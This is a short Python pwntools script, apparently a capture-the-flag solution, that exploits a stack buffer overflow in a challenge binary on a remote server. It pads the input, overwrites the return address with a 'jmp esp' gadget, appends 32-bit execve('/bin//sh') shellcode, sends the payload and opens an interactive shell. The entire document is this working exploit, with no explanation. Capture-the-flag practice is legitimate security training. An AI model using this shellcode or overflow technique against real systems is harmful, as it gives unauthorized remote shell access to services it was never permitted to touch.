
from pwn import *

# r = process('./foo_2')
r = remote('bamboofox.cs.nctu.edu.tw',10102)

shell = b"\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80"

jmp = 0x080485a0 #: jmp esp;

p = b'A' * 24
p += p32(jmp)
p += cyclic(4)
p += shell

r.sendline(p)

r.interactive()

